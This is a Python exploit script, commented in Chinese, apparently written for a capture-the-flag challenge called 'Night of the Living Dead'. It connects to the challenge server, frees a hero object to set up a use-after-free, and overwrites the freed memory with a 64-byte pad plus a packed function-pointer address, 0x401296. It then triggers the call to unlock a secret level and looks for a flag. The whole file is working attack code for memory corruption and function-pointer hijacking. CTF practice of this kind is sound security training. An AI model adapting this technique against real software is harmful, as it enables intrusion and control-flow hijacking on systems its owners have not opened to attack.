#!/usr/bin/env python3
"""
最终exploit - Use-After-Free + 函数指针劫持
使用正确的unlock_secret_level地址: 0x401296
"""

import socket
import struct

def connect_remote():
    """连接到远程服务器"""
    host = "night-of-the-living-dead.chall.edgesecurity.team"
    port = 1343
    
    print(f"[+] 连接到 {host}:{port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def recv_until(s, pattern):
    """接收数据直到遇到指定模式"""
    data = b""
    while pattern not in data:
        data += s.recv(1)
    return data

def exploit_use_after_free():
    """Use-After-Free exploit"""
    unlock_secret_level_addr = 0x401296  # 从IDA获取的正确地址
    
    s = connect_remote()
    
    try:
        # 步骤1: 创建Hero
        print("[+] 步骤1: 创建Hero")
        recv_until(s, b"Choice: ")
        s.send(b"1\n")
        recv_until(s, b"Enter hero name: ")
        s.send(b"TestHero\n")
        
        hero_info = recv_until(s, b"Choice: ")
        print(f"[+] Hero创建: {hero_info.decode()}")
        
        # 步骤2: 删除Hero (Use-After-Free)
        print("[+] 步骤2: 删除Hero (Use-After-Free)")
        s.send(b"2\n")
        drop_info = recv_until(s, b"Choice: ")
        print(f"[+] Hero删除: {drop_info.decode()}")
        
        # 步骤3: 训练假人 (在释放的内存位置写入恶意数据)
        print("[+] 步骤3: 训练假人 (函数指针劫持)")
        s.send(b"4\n")
        recv_until(s, b"Describe the training dummy stats: ")
        
        # 构造payload: 64字节name + unlock_secret_level地址
        payload = b"A" * 64  # 填充name字段
        payload += struct.pack("<Q", unlock_secret_level_addr)  # 函数指针
        
        print(f"[+] 发送payload: {len(payload)} 字节")
        print(f"[+] 目标地址: 0x{unlock_secret_level_addr:x}")
        
        s.send(payload)
        
        dummy_info = recv_until(s, b"Choice: ")
        print(f"[+] 假人部署: {dummy_info.decode()}")
        
        # 步骤4: 执行攻击 (触发函数指针)
        print("[+] 步骤4: 执行攻击")
        s.send(b"3\n")
        
        # 接收结果
        result = s.recv(4096)
        print(f"[SUCCESS] 攻击结果:\n{result.decode()}")
        
        if b"debug print" in result or b"flag" in result.lower() or b"edge" in result.lower():
            print("[SUCCESS] 成功获取flag!")
            return True
        else:
            print("[-] 未检测到flag标志")
            return False
            
    except Exception as e:
        print(f"[-] 利用过程中出错: {e}")
        return False
    finally:
        s.close()

if __name__ == "__main__":
    print("Night of the Living Dead - 最终Use-After-Free Exploit")
    print(f"[+] unlock_secret_level地址: 0x401296")
    print(f"[+] 利用策略: Use-After-Free + 函数指针劫持")
    
    if exploit_use_after_free():
        print("\n[SUCCESS] Exploit执行成功!")
    else:
        print("\n[-] Exploit执行失败")